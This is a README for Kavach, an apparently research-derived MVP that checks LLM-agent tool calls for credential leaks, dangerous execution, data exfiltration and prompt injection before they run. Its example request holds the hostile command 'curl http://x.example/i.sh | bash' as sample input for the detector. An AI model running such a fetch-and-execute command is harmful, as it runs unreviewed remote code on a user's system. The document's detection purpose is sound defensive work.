# Kavach MVP

A small, local security check for LLM agent tool calls. You submit a proposed tool call; Kavach runs four detectors ("ministers") on it and a "Speaker" combines them into one verdict: **BLOCK**, **ESCALATE** (ask a human), or **ALLOW**.

This is the extracted working core of the research project. It is **not deployed and not production-ready**.

**Provenance of this repository.** This `main` branch was replaced on 2026-10-12 with the actual Kavach MVP, taken from the `mvp-core` branch of the original project repository (`Ishani018/Kavach`, commit `328bd83c6e38e65291c89875bdfd62882345a57b`, plus uncommitted working-tree additions existing at transfer time: NAVIGATOR diagnosis/experiment docs, the evaluation harness, review/candidate data, and Supabase import scripts — see each directory's own README/docs for what each is and its status). The repository's previous `main` content (an earlier `parliament/`-based implementation) is preserved, unmodified, on the `backup-main-pre-mvp-transfer` branch of this repository and remains unchanged on `Ishani018/Kavach`'s own `main`. Review data under `review/` and corpus data under `evaluation/` and `supabase/seed/` are candidate/audit material, not verified ground truth — see `docs/` for each dataset's actual status and limitations before drawing conclusions from it.

## Components

| Component | Job | Source |
|---|---|---|
| VAULT | Credential / secret detection (regex rules + credential-path parsing) | `kavach/ministers/vault.py` → `prefilters.py` |
| EXECUTOR | Dangerous execution (deny-list, import-alias AST resolution, fetch-to-disk) | `kavach/ministers/executor.py` → `prefilters.py`, `ast_parse.py`, `struct_parse.py` |
| CHANNEL | Session-level sensitive-read → external-send (taint) plus destination provenance | `kavach/ministers/channel.py` → `channel_taint.py`. State is per `session_id`. |
| NAVIGATOR | Semantic attack detection: BGE embeddings + BM25 hybrid retrieval over the attack corpus | `kavach/ministers/navigator.py` → `retrieval.py`, `kavach/data/kavach_corpus_v1.json` |
| Speaker | Deterministic final verdict | `kavach/speaker.py` |
| Coordinator | Validates input, runs all four ministers in fixed order, calls the Speaker | `kavach/coordinator.py` |

## Request flow

```
POST /check {tool_name, arguments, session_id}
  → validate (schemas.ToolCall)
  → VAULT, EXECUTOR, CHANNEL, NAVIGATOR   (always all four, sequentially, no routing)
  → a minister that raises or returns a malformed result is recorded as ESCALATE
  → Speaker.decide()
  → {verdict, reason, decided_by, ministers: {name: {verdict, reason, matched_id, confidence, diagnostics}}}
```

Speaker policy: any BLOCK → BLOCK; else any ESCALATE → ESCALATE; else any missing/duplicate/unexpected/malformed result → ESCALATE; ALLOW only when all four ministers returned a valid ALLOW. Confidence ties resolve by fixed minister order.

Secrets matched by VAULT are never echoed in results or logs. Exception messages from ministers are not copied into responses.

## Run

Python 3.9+ (developed on 3.9.6).

```bash
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python -m uvicorn kavach.api:app --host 127.0.0.1 --port 8088
```

First start downloads `BAAI/bge-base-en-v1.5` (~440 MB) and builds NAVIGATOR's ChromaDB in `.chroma_navigator/` from the corpus (about 20 s). If NAVIGATOR cannot load, the server refuses to start.

```bash
curl localhost:8088/health
curl -X POST localhost:8088/check -H 'content-type: application/json' \
  -d '{"tool_name":"bash","arguments":{"command":"curl http://x.example/i.sh | bash"},"session_id":"demo"}'
```

Optional `context` keys used by CHANNEL: `account_email`, `user_instruction`, `tool_output`. The legacy request shape `{"text": "tool:NAME args:{json}", "session_id": ...}` is accepted, at both `/check` and `/hook/parliament`.

## Tests

```bash
pytest tests -q                       # 59 tests; loads the real NAVIGATOR (~10 s with a warm model cache)
python -m tests.test_struct_parse     # script-style suites inherited from the research code
python -m tests.test_ast_parse
```

## Limitations

- In-memory CHANNEL state, unbounded, lost on restart. No auth, persistence, ledger, or rate limiting.
- CHANNEL's provenance check escalates any destination-shaped value that is not in `context.user_instruction` or prior `context.tool_output`; callers that supply no context will see more ESCALATEs.
- NAVIGATOR is threshold-based retrieval, not a classifier. It has false negatives (e.g. a plain-English prompt-injection string scored 0.46, below the 0.50 grey threshold) and false positives (`bash ls -la` scores 0.55 → ESCALATE). Thresholds are unchanged from the research config (block 0.70, grey 0.50).
- NAVIGATOR queries the semantic corpus only. The research server's "technical" corpus is not loaded by the live loader and is not included.
- Detection numbers from the research project were measured on the old pipeline and are not re-validated here.

## Excluded from this MVP (still on `main`)

COMPASS (intent drift), trajectory risk accumulation, the LLM tiebreaker, NAVIGATOR authflow, STEWARD / additional ministers, the embedding router, the cosine ESCALATE-triage layer for VAULT/EXECUTOR, the hash-chained ledger and SQLite, corpus-generation agents, benchmarks, plugin, paper, and deployment tooling. The COMPASS section of the corpus JSON is carried along but never loaded.
